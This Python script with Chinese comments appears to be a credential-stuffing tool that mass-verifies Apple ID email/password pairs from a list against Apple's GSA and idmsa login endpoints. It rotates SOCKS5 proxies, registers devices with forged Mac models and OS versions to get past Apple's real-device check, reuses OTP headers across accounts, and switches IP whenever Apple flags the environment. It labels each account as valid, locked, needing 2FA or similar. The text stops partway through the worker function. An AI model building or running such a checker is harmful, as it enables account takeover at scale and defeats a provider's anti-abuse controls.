#!/usr/bin/env python3
"""极简线程模型：一个线程 = 一条 IP + 一台设备 + 一条长连接，跑完配额就退出。

没有 IP 池、没有设备池、没有补货、没有重试调度。
目的只有一个：量清楚"这套流程跑起来到底吃多少 CPU"。

每个线程做的事：
    1. 向代理接口领一条 IP（num=1）
    2. 建 SOCKS5 + TLS（requests.Session，keep-alive）
    3. 注册一台设备（fetch_headers registered=False，只做一次）
    4. 循环：取一个账号 → 向该设备领一个公共头(OTP) → 用同一条连接验证

用法：
    python3 simple.py --threads 50 --limit 200
    python3 simple.py --threads 50 --limit 200 --no-register   # 复用已注册设备
"""
from __future__ import annotations

import argparse
import json
import os
import queue
import random
import re
import statistics
import sys
import threading
import time
import urllib.request


SHUFFLE_SEED = 20261125


def wait_for_proxy_when_tasks_remain(pending, stopped=False):
    """A temporary empty proxy pool must not retire a worker with queued work."""
    return int(pending) > 0 and not bool(stopped)


def load_accounts(path, limit, shuffle=True):
    rows = [l.strip() for l in open(path, encoding='utf-8', errors='replace')
            if l.strip() and '----' in l]
    if shuffle:
        # 固定种子：多进程各自按 offset 切片时必须看到完全相同的顺序，
        # 否则切片互相重叠，会重复验证同一批账号、漏掉另一批。
        import random
        random.Random(SHUFFLE_SEED).shuffle(rows)
    if limit:
        rows = rows[:limit]
    out = []
    for line in rows:
        email, _, password = line.partition('----')
        out.append((email.strip(), password.strip()))
    return out


def proxy_alive(proxy, timeout=8.0):
    """探活：经 SOCKS5 打一次 GET，**必须用系统 CA 正常校验**。

    关掉校验只能掩盖 TLS 链路本身的问题，会把"证书都不对"的出口当成好出口。
    """
    import requests
    session = requests.Session()
    session.trust_env = False
    try:
        session.get('https://gsa.apple.com/',
                    proxies={'http': proxy, 'https': proxy},
                    timeout=(timeout, timeout), verify=True, allow_redirects=False)
        return True
    except Exception:                                              # noqa: BLE001
        return False
    finally:
        session.close()


def classify_web_method(web):
    """把 au=repair 的 web 响应细化成具体流程（不改变 GSA 的 need_2fa 结论）。

    对应 cluster-lab 的 _repair_probe_method：
      verification_code  — 确实是验证码挑战
      security_repair    — 安全修复流程，不是验证码
      repair_unspecified — 还是说不清
    """
    web = web if isinstance(web, dict) else {}
    status = str(web.get('status') or '').strip().casefold()
    auth = str(web.get('auth_type') or '').strip().casefold()
    if status == 'need_2fa' and auth in ('hsa', 'hsa2'):
        return 'verification_code'
    if auth in ('sa', 'non-sa', 'dnu') or status == 'needs_setup':
        return 'security_repair'
    return 'repair_unspecified'


# 只有这些原因值得换环境重试；明确结论（密码错/锁定/不存在/双重验证）绝不重试
RETRY_HTTP0 = 'http0'        # 连不上 → 换 IP
RETRY_5XX = '5xx'            # 502/503/504 → 换 IP
RETRY_ENV = 'env'            # -22421 设备环境异常 → 换 IP + 换公共头
RETRY_TIMEOUT = 'timeout'    # 超时 → 换 IP
RETRY_NONE = None


# Apple 对部分账号要求"必须用真 Mac 登录"，GSA 通道满足不了，不重试也不改判
EC_NEED_MAC = -23782

# anisette 服务（sidestore 等）注册时写死 macOS 10.12.6，低于 Apple 门槛 10.13，
# 对高风险账号直接回 -23782。正确做法是**注册时就把型号报给它**（同 cluster-lab），
# 不是事后改回包头：型号、系统、UA 三者要自洽，且同一台设备必须永远一致。
# 这里用 10.13.6 + 2013-2016 老机型——刚好过线，且这套组合本来就能跑该版本。
_OS = 'Mac OS X;10.13.6;17G65'
_UA = 'akd/1.0 CFNetwork/902.2 Darwin/17.7.0'
_KIT = '<com.apple.AuthKit/1 (com.apple.akd/1.0)>'
DEVICE_MODELS = (
    'MacBookPro11,1', 'MacBookPro11,2', 'MacBookPro11,3', 'MacBookPro11,4', 'MacBookPro11,5',
    'MacBookPro12,1', 'MacBookPro13,1', 'MacBookPro13,2', 'MacBookPro13,3',
    'MacBookPro14,1', 'MacBookPro14,2', 'MacBookPro14,3',
    'MacBookAir6,1', 'MacBookAir6,2', 'MacBookAir7,1', 'MacBookAir7,2',
    'iMac14,1', 'iMac14,2', 'iMac14,3', 'iMac14,4', 'iMac15,1', 'iMac16,1', 'iMac16,2', 'iMac17,1',
    'Macmini7,1', 'MacPro6,1',
)


def device_profile(pool, slot):
    """注册时随机挑型号并落盘，之后这台设备永远报同一个（同 cluster-lab 做法）。

    随机是为了避免"槽位 1 永远是 MacBookPro11,1"这种规律；
    落盘是为了同一台设备不会一会儿报 MacBook、一会儿报 iMac——那比型号单调更可疑。
    """
    try:
        path = pool.slot_directory(slot) / 'device-profile.json'
    except Exception:                                              # noqa: BLE001
        path = None
    if path is not None and path.exists():
        try:
            data = json.loads(path.read_text(encoding='utf-8'))
            if isinstance(data, dict) and data.get('client_info') and data.get('user_agent'):
                return data
        except (OSError, ValueError):
            pass
    model = random.SystemRandom().choice(DEVICE_MODELS)
    profile = {'model': model,
               'client_info': f'<{model}> <{_OS}> {_KIT}',
               'user_agent': _UA}
    if path is not None:
        try:
            path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
            fd = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
            with os.fdopen(fd, 'w', encoding='utf-8') as handle:
                handle.write(json.dumps(profile, ensure_ascii=False))
        except (FileExistsError, OSError):
            try:
                return json.loads(path.read_text(encoding='utf-8'))
            except (OSError, ValueError):
                pass
    return profile


def refine_status(result, bucket):
    """在 result_bucket 之上补一个明确的分类：-23782 = 需要真机。"""
    try:
        ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        return bucket
    if ec == EC_NEED_MAC:
        return 'need_mac'
    return bucket


def retry_kind(result, bucket):
    """判断这次结果要不要重试，以及该换什么。

    返回 (kind, summary)：
      RETRY_HTTP0 / RETRY_5XX / RETRY_TIMEOUT → 换 IP 再来
      RETRY_ENV                               → 换 IP 且换公共头
      RETRY_NONE                              → 结果明确，不重试
    """
    if bucket in ('wrong_password', 'locked', 'security_lock',
                  'not_found', 'valid', 'need_2fa', 'need_mac'):
        return RETRY_NONE, ''                    # 明确结论，重试没意义
    try:
        http = int(result.get('http') or 0)
    except (TypeError, ValueError):
        http = 0
    try:
        ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        ec = None
    if ec == -22421:
        return RETRY_ENV, f'ec={ec}'
    if http == 0:
        return RETRY_HTTP0, 'http=0'
    if http in (500, 502, 503, 504):
        return RETRY_5XX, f'http={http}'
    if bucket == 'timeout':
        return RETRY_TIMEOUT, f'http={http}'
    return RETRY_NONE, ''


def local_exception_result(exc):
    """Turn a caught local exception into a safe, classifiable result.

    Network exception messages can contain proxy credentials or request data, so
    only exception class names are persisted.  Transport failures are explicit
    timeouts and therefore enter the normal retry path; programming errors stay
    undetermined but retain a useful class name instead of becoming a blank row.
    """
    pending, seen, names = [exc], set(), []
    while pending and len(seen) < 12:
        value = pending.pop()
        if not isinstance(value, BaseException) or id(value) in seen:
            continue
        seen.add(id(value))
        names.append(type(value).__name__)
        pending.extend((value.__cause__, value.__context__))
        pending.extend(arg for arg in value.args if isinstance(arg, BaseException))
        reason = getattr(value, 'reason', None)
        if isinstance(reason, BaseException):
            pending.append(reason)
    names = names or ['Exception']
    joined = ' '.join(names).casefold()
    transient = any(token in joined for token in (
        'timeout', 'connection', 'proxy', 'socket', 'ssl', 'tls', 'urlerror',
        'remote', 'eof', 'brokenpipe', 'network', 'websocket', 'http',
    ))
    result = {
        'status': 'timeout' if transient else 'error',
        'kind': names[0],
        'stage': 'local',
        'detail': ('本地链路异常: ' if transient else '本地程序异常: ')
                  + ' <- '.join(names[:4]),
    }
    if transient:
        result['http'] = 0
    return result


def classify_web(web):
    """web(idmsa) 的 detail 是中文，不能走英文关键词匹配，直接看 ec。"""
    try:
        ec = int(web.get('apple_ec'))
    except (TypeError, ValueError):
        ec = None
    try:
        http = int(web.get('http') or 0)
    except (TypeError, ValueError):
        http = 0
    if ec == -20209:
        return 'security_lock'      # 账户已锁定（与 GSA 的 locked 对应）
    if ec == -20101:
        return 'wrong_password'     # 账户信息不正确
    if ec in (-20970,):
        return 'not_found'
    if ec == -22421 or http in (502, 503):
        return 'web_unavailable'    # 链路/前置层拒绝，不代表账号状态
    if http == 0:
        return 'web_timeout'
    return str(web.get('status') or 'error')


def fetch_usable_ip(api, timeout=8.0, attempts=4):
    for _ in range(attempts):
        proxy = fetch_one_ip(api)
        if proxy and proxy_alive(proxy, timeout):
            return proxy
    return None


def fetch_one_ip(api):
    """领一条 IP。失败返回 None，由调用方重试。"""
    try:
        with urllib.request.urlopen(api.format(num=1), timeout=20) as resp:
            body = resp.read().decode('utf-8', 'replace')
    except Exception:
        return None
    for line in body.splitlines():
        line = line.strip()
        if line and ':' in line and not line.startswith('{'):
            # 供应商返回的是 SOCKS5 端口：必须显式声明协议，
            # 否则 requests 会补成 http:// 去发 CONNECT，服务器直接断开。
            return line if '://' in line else f'socks5h://{line}'
    return None


def proxy_api_default():
    """凭据不进源码：优先环境变量，其次 secrets.json，最后 conf.json。"""
    env = os.environ.get('GSA_PROXY_API')
    if env:
        return env
    for name in ('secrets.json', 'conf.json'):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        try:
            with open(path, encoding='utf-8') as handle:
                value = json.load(handle).get('proxy_api')
            if isinstance(value, str) and '{num}' in value:
                return value
        except (OSError, ValueError):
            continue
    return ''


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--accounts', default='/Users/xxx/Downloads/测试.txt')
    ap.add_argument('--api', default=proxy_api_default())
    ap.add_argument('--fastcheck', default='',
                    help='fastcheck 所在目录；留空则用包内自带的 fastcheck/')
    ap.add_argument('--device-root', default='./data/devices-simple')
    ap.add_argument('--threads', type=int, default=50)
    ap.add_argument('--limit', type=int, default=0, help='0=全部')
    ap.add_argument('--offset', type=int, default=0, help='从第几条账号开始（多进程切分用）')
    ap.add_argument('--slot-base', type=int, default=0, dest='slot_base',
                    help='设备槽位基址，多进程时各进程不重叠')
    ap.add_argument('--timeout', type=float, default=10.0)
    ap.add_argument('--retries', type=int, default=0,
                    help='协议内重试（同一 IP 同一公共头），一般留 0')
    ap.add_argument('--no-fix-os', action='store_true', dest='no_fix_os',
                    help='不覆盖 macOS 10.12 的设备头（默认会覆盖成 14.0，避免 -23782）')
    ap.add_argument('--item-timeout', type=float, default=20.0, dest='item_timeout',
                    help='单条账号的墙钟总预算（含所有重试），超了就判超时放弃')
    ap.add_argument('--retry', type=int, default=2, dest='retry',
                    help='外层重试：http=0 / 5xx / -22421 时换 IP 重来（0=不重试）')
    ap.add_argument('--no-register', action='store_true')
    ap.add_argument('--register-workers', type=int, default=0,
                    help='并发注册设备数上限，0=每个工作线程可独立注册')
    ap.add_argument('--anisette-workers', type=int, default=0,
                    help='并发请求公共头的上限，0=不限（实测服务端扛得住）')
    ap.add_argument('--verify-web', action='store_true', dest='verify_web',
                    help='GSA 判为 locked/security_lock 时，用 web 协议(idmsa)再验一次')
    ap.add_argument('--web-timeout', type=float, default=10.0, dest='web_timeout')
    ap.add_argument('--no-client-cache', action='store_true',
                    help='关闭 Client 复用（每条都新建，用于对照）')
    ap.add_argument('--anisette-proxy', action='store_true',
                    help='公共头也走代理（机房 IP 直连 sidestore 被墙时必须开）')
    ap.add_argument('--anisette-timeout', type=float, default=30.0,
                    dest='anisette_timeout',
                    help='anisette 单次请求超时；连不上时会快速失败')
    ap.add_argument('--register-timeout', type=float, default=20.0,
                    dest='register_timeout',
                    help='设备注册单次超时；超时后换代理继续注册')
    ap.add_argument('--per-ip', type=int, default=9, help='一条 IP 跑多少条账号')
    ap.add_argument("--otp-reuse", type=int, default=15, dest="otp_reuse",
                    help='一个公共头能验多少条账号（实测 15-20 安全，0=每条都换）')
    ap.add_argument('--ip-ttl', type=float, default=50.0, help='单条 IP 可用秒数（供应商 60 秒）')
    ap.add_argument('--ip-batch', type=int, default=1000, help='单次最多拉多少条')
    ap.add_argument('--ip-interval', type=float, default=3.0, help='supplier 检查间隔秒')
    ap.add_argument('--no-ip-pool', action='store_true', help='关掉池，回到每线程自取')
    ap.add_argument('--no-precheck', action='store_true')
    ap.add_argument('--precheck-timeout', type=float, default=8.0)
    ap.add_argument('--out', default='./data/simple-run.jsonl')
    ap.add_argument('--live', default='./data/live.json', help='实时状态文件，供页面读取')
    args = ap.parse_args()

    _here = os.path.dirname(os.path.abspath(__file__))
    _local = os.path.join(_here, 'fastcheck')
    if os.path.isdir(_local):
        sys.path.insert(0, _here)            # 让 import fastcheck 命中包内的
    elif args.fastcheck and os.path.isdir(args.fastcheck):
        sys.path.insert(0, args.fastcheck)
    else:
        raise SystemExit(
            f'找不到 fastcheck 模块。应放在 {_local}，'
            f'或用 --fastcheck 指定目录')
    from fastcheck.protocols import gsa_status as gs
    from fastcheck.devices import DevicePool, count_registered_devices
    from fastcheck.protocols.srp_auth import SRP_MATH_BACKEND
    from fastcheck.status import result_bucket

    os.makedirs(os.path.dirname(args.out) or '.', exist_ok=True)
    if args.offset or args.limit:
        # 先全部读出来再切，保证多进程切分不重叠
        full = load_accounts(args.accounts, 0)
        start = max(0, int(args.offset))
        rows = full[start:start + args.limit] if args.limit else full[start:]
    else:
        rows = load_accounts(args.accounts, 0)
    print(f'账号 {len(rows)} 条（offset={args.offset}）| 线程 {args.threads} '
          f'| 槽位 {args.slot_base + 1}-{args.slot_base + args.threads} '
          f'| SRP {SRP_MATH_BACKEND}')
    if SRP_MATH_BACKEND != 'gmpy2':
        print('  警告：gmpy2 未生效，SRP 单次约 9.8ms 而不是 2.2ms')

    _rw = int(args.register_workers)
    register_gate = threading.Semaphore(_rw if _rw > 0 else max(1, args.threads))
    _aw = int(args.anisette_workers)
    anisette_gate = threading.Semaphore(_aw if _aw > 0 else max(1, args.threads))
    ip_pool = None
    if not args.no_ip_pool:
        from gsafast.ippool import IpPool
        ip_pool = IpPool(args.api, threads=args.threads, ttl=args.ip_ttl,
                         per_ip=args.per_ip, batch=args.ip_batch,
                         refill_interval=args.ip_interval)
        warmed = ip_pool.warm(extra=1)
        ip_pool.start()
        print(f'IP 池: 预热 {warmed} 条（每线程先分 1 条，其余共享） '
              f'ttl={args.ip_ttl:.0f}s 单次上限={args.ip_batch}')

    # 按线程预切分：线程只读自己的列表，共享队列彻底消失
    shards = [[] for _ in range(args.threads)]
    for index, item in enumerate(rows):
        shards[index % args.threads].append(item)
    print(f'账号已切成 {args.threads} 份，每份约 {len(rows)//args.threads} 条')
    lock = threading.Lock()
    sink = open(args.out, 'w', encoding='utf-8')
    write_buffer = []          # 攒够再落盘，避免每条都 fsync
    import collections
    started = time.perf_counter()
    wall_started = time.time()
    proc_cpu_start = time.process_time()
    main_cpu0 = time.thread_time()      # 主线程 CPU（写盘、序列化都在这里）
    results = {'done': 0, 'cpu': 0.0, 'by_status': {}, 'per_thread_cpu': [],
               'per_thread_count': [], 'samples': [], 'ip_fail': 0,
               'total': len(rows), 'expected': len(rows), 'started': started,
               'recent': collections.deque(maxlen=12),
               'device_ready': set(), 'device_in_use': set(),
               'device_registering': set(), 'register_errors': 0,
               'register_error_types': {}}
    stop = threading.Event()

    SAMPLE_CAP = 4000          # 历史样本上限，超出只保留最近的一批

    def live_writer():
        """每秒把当前进度写成 JSON。分位数只在 done 变化时重算。"""
        wcpu0 = time.thread_time()
        path = args.live
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        cached = {'done': -1, 'p50': None, 'p90': None}
        while not stop.is_set():
            with lock:
                done = results['done']
                elapsed = time.perf_counter() - started
                by_status = dict(results['by_status'])
                cpu = results['cpu']
                recent = list(results['recent'])
                device_in_use = len(results['device_in_use'])
                device_registering = len(results['device_registering'])
                register_errors = results['register_errors']
                register_error_types = dict(results['register_error_types'])
                samples = results['samples']
                if len(samples) > SAMPLE_CAP:
                    del samples[:-SAMPLE_CAP]
                if done != cached['done']:                      # 只有新增结果才重算
                    ms = sorted(r['ms'] for r in samples)
                    cached['p50'] = round(statistics.median(ms)) if ms else None
                    cached['p90'] = ms[int(len(ms) * .9)] if ms else None
                    cached['done'] = done
            # “已注册”是磁盘上持久化且完成注册的设备总数，不是
            # 本轮已完成初始化的工作线程数。
            device_registered = count_registered_devices(
                args.device_root, 'https://new.ani.sidestore.io')
            ms = None
            payload = {
                'started': time.strftime('%H:%M:%S', time.localtime(wall_started)),
                'elapsed': round(elapsed, 1),
                'total': results['total'], 'done': done,
                'rate': round(done / elapsed, 2) if elapsed else 0,
                'per_hour': round(done / elapsed * 3600) if elapsed else 0,
                'eta': round((results['total'] - done) / (done / elapsed), 0)
                       if done and elapsed else None,
                'threads': args.threads, 'processes': 1, 'backend': SRP_MATH_BACKEND,
                'engine': 'threading',
                'accounts': args.accounts,
                'cpu_seconds': round(cpu, 2),
                'cpu_cores': round(cpu / elapsed, 3) if elapsed else 0,
                'cpu_per_account': round(cpu / done * 1000, 1) if done else 0,
                # 进程口径：包含所有线程（业务 + supplier + 主线程），单进程时可信
                'proc_cpu_seconds': round(time.process_time() - proc_cpu_start, 2),
                'proc_cpu_cores': round((time.process_time() - proc_cpu_start) / elapsed, 3)
                                   if elapsed else 0,
                'ip_fail': results['ip_fail'],
                'ip_pool': ip_pool.snapshot() if ip_pool is not None else None,
                'retried': results.get('retried', 0),
                'budget_hit': results.get('budget_hit', 0),
                'by_retry': results.get('by_retry') or {},
                'otp_hit': results.get('otp_hit', 0),
                'writer_cpu': round(time.thread_time() - wcpu0, 2),
                'main_cpu': round(time.thread_time() - main_cpu0, 2),
                'otp_fetch': results.get('otp_fetch', 0),
                'device_ready': device_registered,  # 兼容旧页面/旧汇总器
                'device_registered': device_registered,
                'device_in_use': device_in_use,
                'device_registering': device_registering,
                'register_errors': register_errors,
                'register_error_types': register_error_types,
                'seg': {k: (round(sorted(v)[len(v)//2],1) if v else None)
                        for k, v in (results.get('seg') or {}).items()},
                'by_status': by_status,
                'by_web': results.get('by_web') or {},
                'cross': results.get('cross') or {},
                'by_method': results.get('by_method') or {},
                'p50': cached['p50'],
                'p90': cached['p90'],
                'sample_count': len(samples),
                'recent': recent,
            }
            tmp = path + '.tmp'
            try:
                with open(tmp, 'w', encoding='utf-8') as handle:
                    json.dump(payload, handle, ensure_ascii=False)
                os.replace(tmp, path)
            except OSError:
                pass
            stop.wait(1.0)

    def worker(tid):
        my_tasks = shards[tid] if tid < len(shards) else []
        slot = args.slot_base + tid + 1
        # ---- 1) 领一条 IP ----
        proxy = None
        if ip_pool is None:
            # 非池模式：线程自取一条，全程复用
            if args.no_precheck:
                for _ in range(8):
                    proxy = fetch_one_ip(args.api)
                    if proxy:
                        break
                    time.sleep(0.5)
            else:
                proxy = fetch_usable_ip(args.api, args.precheck_timeout)
            if not proxy:
                with lock:
                    results['ip_fail'] += 1
                return
        # ---- 2) 设备（线程独占一个槽位）----
        boot = {}
        _b0 = time.thread_time()
        pool = DevicePool(args.device_root, 'https://new.ani.sidestore.io',
                          max_devices=args.slot_base + args.threads)
        boot['pool_ctor'] = (time.thread_time() - _b0) * 1000
        # 注册前就把型号定下来，随 provisioning 一起提交给 anisette；
        # 之后这台设备的所有请求都必须报同一个型号。
        _b0 = time.thread_time()
        profile = device_profile(pool, slot) if not args.no_fix_os else None
        boot['profile'] = (time.thread_time() - _b0) * 1000
        state = pool.inspect(slot).get('state')
        needs_registration = not args.no_register and state != 'ready'
        if needs_registration:
            with lock:
                results['device_registering'].add(slot)

        def acquire_anisette_route():
            """注册/公共头都用线程自己的代理；池模式失败后可换下一条。"""
            nonlocal proxy
            if not args.anisette_proxy:
                return None, 0.0
            if ip_pool is not None:
                return ip_pool.acquire(tid, wait=60.0)
            if proxy is None:
                proxy = (fetch_one_ip(args.api) if args.no_precheck
                         else fetch_usable_ip(args.api, args.precheck_timeout))
            return proxy, time.monotonic() + args.ip_ttl if proxy else 0.0

        def release_anisette_route(route, expires, healthy):
            nonlocal proxy
            if ip_pool is not None:
                ip_pool.release(tid, route, expires, healthy=healthy)
            elif route and not healthy:
                proxy = None

        # 首次注册失败不能让整个 worker 退出。代理模式下丢弃坏出口，
        # 换下一条继续，直到本线程的设备槽位注册成功或任务被停止。
        _info_cpu = _register_cpu = 0.0
        _w0 = time.perf_counter()
        info = None
        register_failures = 0
        while not stop.is_set():
            reg_proxy, reg_exp = acquire_anisette_route()
            if args.anisette_proxy and not reg_proxy:
                with lock:
                    results['register_errors'] += 1
                    kinds = results['register_error_types']
                    kinds['no_proxy'] = kinds.get('no_proxy', 0) + 1
                register_failures += 1
                stop.wait(min(8.0, 0.25 * (2 ** min(register_failures, 5)))
                          + random.uniform(0.0, 0.25))
                continue
            try:
                _b0 = time.thread_time()
                info = pool.info(max(args.timeout, 20), proxy=reg_proxy,
                                 provider_direct=reg_proxy is None)
                _info_cpu += (time.thread_time() - _b0) * 1000
                if profile:
                    info = dict(info, client_info=profile['client_info'],
                                user_agent=profile['user_agent'])
                if needs_registration:
                    _b0 = time.thread_time()
                    with register_gate:
                        pool.fetch_headers(
                            slot, info, max(1.0, float(args.register_timeout)), registered=False,
                            proxy=reg_proxy, provider_direct=reg_proxy is None)
                    _register_cpu += (time.thread_time() - _b0) * 1000
                release_anisette_route(reg_proxy, reg_exp, True)
                with lock:
                    results['device_registering'].discard(slot)
                    results['device_ready'].add(slot)
                    results['device_in_use'].add(slot)
                break
            except Exception as exc:                           # noqa: BLE001
                release_anisette_route(reg_proxy, reg_exp, False)
                stage = str(getattr(exc, 'stage', '') or type(exc).__name__)
                http = int(getattr(exc, 'http', 0) or 0)
                reason = f'{stage}:HTTP{http}' if http else stage
                with lock:
                    results['register_errors'] += 1
                    kinds = results['register_error_types']
                    kinds[reason] = kinds.get(reason, 0) + 1
                if not args.anisette_proxy:
                    raise
                # 不设全局并发上限；每个线程独立换代理重试。但失败后必须退避，
                # 否则数百线程会同时重建 TLS/WebSocket，吃满 CPU 并把 503 放大。
                register_failures += 1
                stop.wait(min(8.0, 0.25 * (2 ** min(register_failures, 5)))
                          + random.uniform(0.0, 0.25))
        if info is None:
            return
        boot['info'] = _info_cpu
        boot['register_cpu'] = _register_cpu
        boot['register_wall'] = (time.perf_counter() - _w0) * 1000
        # ---- 2.5) 公共头客户端：建一次，之后只发 POST ----
        # 直连时复用 Client；代理模式每次刷新公共头都用当前线程正在使用的
        # 代理，避免把一个 60 秒代理固定缓存到整个长任务。
        _b0 = time.thread_time()
        cached_client = None
        if not args.no_client_cache and not args.anisette_proxy:
            from fastcheck.protocols.anisette_v3 import Client
            cached_client = Client(
                'https://new.ani.sidestore.io',
                timeout=max(args.timeout, 20),
                store=pool.store(slot, registered=True),
                client_info=dict(info),
                provider_direct=True)
            cached_client.deadline = time.monotonic() + max(args.timeout, 20)
        boot['client_ctor'] = (time.thread_time() - _b0) * 1000

        def fetch_otp():
            """两条路径都必须过同一个并发闸门，否则 anisette-workers 形同虚设。

            注意：给 anisette 传了 client_info 之后，它就不再回传
            X-MMe-Client-Info；必须把 profile 里的型号补回 identity，
            否则 gs.check 会带着空的设备头去打 Apple。
            """
            if cached_client is not None:
                with anisette_gate:
                    # anisette 超时单独控制：默认 30 秒，连不上时快速失败
                    cached_client.deadline = time.monotonic() + max(args.anisette_timeout, 10)
                    raw = cached_client.headers()
            else:
                with anisette_gate:
                    raw = pool.fetch_headers(
                        slot, info, max(args.timeout, 20), registered=True,
                        proxy=proxy if args.anisette_proxy else None,
                        provider_direct=not args.anisette_proxy)
            if profile and isinstance(raw, dict):
                raw = dict(raw)
                raw['X-MMe-Client-Info'] = profile['client_info']
                raw['X-Mme-Client-Info'] = profile['client_info']
                raw.setdefault('User-Agent', profile['user_agent'])
            return raw

        # ---- 3) 循环验证：每 per_ip 条换 IP，每 otp_reuse 条换公共头 ----
        cached_otp = None
        otp_used = 0
        local_retries = {}
        with lock:
            bag = results.setdefault('boot_segments', {})
            for k, v in boot.items():
                bag.setdefault(k, []).append(v)
        cpu_start = time.thread_time()
        mine = 0
        while not stop.is_set():
            # 池模式每轮重新领一条；非池模式保留线程启动时取得的固定代理。
            proxy_exp = 0.0
            t_ip = time.perf_counter()
            if ip_pool is not None:
                proxy, proxy_exp = ip_pool.acquire(tid, wait=60.0)
            ip_ms = (time.perf_counter() - t_ip) * 1000
            if proxy is None:
                with lock:
                    results['ip_fail'] += 1
                # 代理池短暂断货不能让 worker 退出，否则这个线程
                # 已分配但未处理的整个账号分片会被直接丢下，最终任务
                # 显示 incomplete。保留分片等待 supplier 下一次补池。
                if not wait_for_proxy_when_tasks_remain(len(my_tasks), stop.is_set()):
                    break
                stop.wait(0.5 + random.uniform(0.0, 0.5))
                continue
            served = ok_count = 0
            t_prev_end = time.perf_counter()      # 上一轮记录完的时刻
            while served < args.per_ip and not stop.is_set():
                t_loop = time.perf_counter()
                gap_ms = (t_loop - t_prev_end) * 1000   # 轮与轮之间的空档
                if not wait_for_proxy_when_tasks_remain(len(my_tasks), stop.is_set()):
                    break
                email, password = my_tasks.pop()
                task_key = (email, password)
                local_retry_count = local_retries.get(task_key, 0)
                t0 = time.perf_counter()
                cpu0 = time.thread_time()
                attempts = 0
                retry_reason = ''
                budget_hit = False
                t_otp = time.perf_counter()
                c0_otp = time.thread_time()
                otp_cpu = chk_cpu = 0.0
                try:
                    # 同一个 OTP 复用若干条：设备注册时那一次就能摊薄到 15 条上
                    if (cached_otp is None or args.otp_reuse <= 0
                            or otp_used >= args.otp_reuse):
                        cached_otp = fetch_otp()
                        otp_used = 0
                    identity = cached_otp
                    otp_used += 1
                    otp_ms = (time.perf_counter() - t_otp) * 1000
                    otp_cpu = (time.thread_time() - c0_otp) * 1000
                    # ---- 外层重试：只有链路/环境问题才换环境重来 ----
                    attempts = 0
                    t_chk = time.perf_counter()
                    c0_chk = time.thread_time()
                    budget = max(1.0, float(args.item_timeout))
                    deadline = t0 + budget          # 从拿到这条账号开始算
                    budget_hit = False
                    while True:
                        attempts += 1
                        remain = deadline - time.perf_counter()
                        if remain < 1.0:
                            # 预算耗尽：不再发请求，直接判超时
                            result = {'status': 'timeout', 'kind': 'budget',
                                      'detail': f'单条预算 {budget:.0f}s 用尽', 'http': 0}
                            budget_hit = True
                            retry_reason = 'budget'
                            break
                        # gs.check 内部有 init + complete 两跳，每跳都要受剩余预算约束
                        per_hop = max(2.0, min(float(args.timeout), remain / 2))
                        result = gs.check(email, password, proxy,
                                          timeout=per_hop,
                                          retries=args.retries, identity=identity)
                        probe_status = refine_status(result, result_bucket(result))
                        kind, why = retry_kind(result, probe_status)
                        if kind is None or attempts > args.retry or stop.is_set():
                            retry_reason = why if attempts > 1 else ''
                            break
                        retry_reason = why
                        # 换 IP：归还当前这条（标记为坏），取新的
                        if ip_pool is not None:
                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
                            proxy, proxy_exp = ip_pool.acquire(tid, wait=20.0)
                            if proxy is None:
                                break
                        # 环境异常（-22421）还要顺带换一个公共头
                        if kind == RETRY_ENV:
                            cached_otp = None
                            otp_used = 0
                            try:
                                cached_otp = fetch_otp()
                                identity = cached_otp
                                otp_used = 1
                            except Exception:
                                pass
                        served = max(0, served - 1)   # 重试不占 per_ip 配额
                    chk_ms = (time.perf_counter() - t_chk) * 1000
                    chk_cpu = (time.thread_time() - c0_chk) * 1000
                except Exception as exc:                            # noqa: BLE001
                    otp_ms = chk_ms = 0.0
                    otp_cpu = chk_cpu = 0.0
                    result = local_exception_result(exc)
                    previous = local_retries.get(task_key, 0)
                    attempts = 1
                    # 公共头/代理等本地链路异常以前会直接吞成“其他”。现在
                    # 清掉可能损坏的公共头，换出口后把同一账号放回本线程，
                    # 最多按 --retry 重试；程序错误仍保留为可诊断的“其他”。
                    if (result.get('status') == 'timeout' and previous < args.retry
                            and not stop.is_set()):
                        local_retries[task_key] = previous + 1
                        cached_otp = None
                        otp_used = 0
                        replacement = proxy
                        if ip_pool is not None:
                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
                            replacement, proxy_exp = ip_pool.acquire(tid, wait=20.0)
                        elif args.api:
                            replacement = (fetch_one_ip(args.api) if args.no_precheck
                                           else fetch_usable_ip(args.api, args.precheck_timeout))
                        if replacement is not None:
                            proxy = replacement
                            my_tasks.append((email, password))
                            continue
                    local_retries.pop(task_key, None)
                if local_retry_count:
                    attempts += local_retry_count
                    retry_reason = retry_reason or 'local_http=0'
                    local_retries.pop(task_key, None)
                elapsed = (time.perf_counter() - t0) * 1000
                thread_cpu = (time.thread_time() - cpu0) * 1000
                c0_tail = time.thread_time()
                raw_status = str(result.get('status') or 'error')
                status = refine_status(result, result_bucket(result))
                bucket_cpu = (time.thread_time() - c0_tail) * 1000
                try:
                    got_http = int(result.get('http') or 0)
                except (TypeError, ValueError):
                    got_http = 0
                if got_http:
                    ok_count += 1
                web = {}
                web_status = web_ec = None
                web_detail = ''
                web_method = None
                web_ms = 0.0
                final_status = status
                overridden = False
                # 只对 au=repair 复核：GSA 的 au 是个大伞，只说"要继续验证"，
                # 具体是验证码还是安全修复不明确，才值得用 web 细化一次。
                # au=hsa/hsa2 本身就是明确的验证码流程，不做复核。
                auth_type = str(result.get('auth_type') or '').strip().casefold()
                wants_web = (bool(args.verify_web) and status == 'need_2fa'
                             and auth_type == 'repair')
                if wants_web:
                    from fastcheck.protocols import idmsa
                    wt0, wc0 = time.perf_counter(), time.thread_time()
                    try:
                        web = idmsa.check(email, password, proxy,
                                          timeout=args.web_timeout, retries=0)
                        web_ec = web.get('apple_ec')
                        web_status = classify_web(web)
                        web_detail = str(web.get('detail') or '')[:120]
                    except Exception as exc:                        # noqa: BLE001
                        web_status = 'web_error'
                    web_ms = round((time.perf_counter() - wt0) * 1000, 1)
                    thread_cpu += (time.thread_time() - wc0) * 1000
                    elapsed = (time.perf_counter() - t0) * 1000
                    # GSA 权威，web 只细化"到底是要验证码还是要做安全修复"
                    web_method = classify_web_method(web)
